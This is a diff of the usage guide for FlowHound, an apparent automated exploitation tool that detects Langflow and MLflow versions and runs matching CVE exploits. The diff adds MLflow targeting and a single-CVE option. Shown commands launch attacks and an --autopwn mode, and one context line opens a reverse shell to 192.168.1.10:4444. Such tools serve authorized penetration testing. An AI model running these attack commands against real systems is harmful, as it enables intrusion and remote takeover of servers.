@@ -20,20 +20,26 @@ flowhound --help
 
 ## 2. Detect the target version
 
-The `sniff` command queries the target's API, reports the Langflow version, and lists all known CVEs that apply — **without launching any exploits**.
+The `sniff` command probes the target, reports the application and version, and lists all known CVEs that apply — **without launching any exploits**.
 
 ```bash
 flowhound sniff --url http://TARGET:7860
 ```
 
-Example output:
+Example output (Langflow):
 
 ```
-[+] Checking target Langflow version.
-[+] Retrieving all known exploits for Langflow version 1.0.0:
+[+] Detected langflow version 1.0.0.
+[+] Retrieving all known exploits for langflow version 1.0.0:
 [+] flowhound.vulnerabilities.exploits.cve_2026_9198
 [+] flowhound.vulnerabilities.exploits.cve_2026_19295
 ...
+```
+
+For MLflow, pass `--application` to skip auto-detection:
+
+```bash
+flowhound sniff --url http://TARGET:5000 --application mlflow
 ```
 
 Use `sniff` first to confirm the target is reachable and to understand which CVEs apply before proceeding with an attack.
@@ -48,9 +54,15 @@ flowhound attack --url http://TARGET:7860
 
 FlowHound will:
 
-1. Detect the Langflow version.
+1. Detect the application and version.
 2. Query the vulnerability database for applicable CVEs (unauthenticated only).
 3. Run the highest-priority exploit and stop on the first success.
+
+To target MLflow directly and skip auto-detection:
+
+```bash
+flowhound attack --url http://TARGET:5000 --application mlflow
+```
 
 ---
 
@@ -84,7 +96,17 @@ flowhound attack --url http://TARGET:7860 --reverse_shell 192.168.1.10:4444
 
 ---
 
-## 6. Run all matching exploits
+## 6. Target a specific CVE
+
+Use `--cve` to limit execution to a single named CVE:
+
+```bash
+flowhound attack --url http://TARGET:5000 --cve CVE-2023-1177
+```
+
+---
+
+## 7. Run all matching exploits
 
 By default FlowHound stops at the first successful exploit. Use `--autopwn` to run every applicable exploit:
 
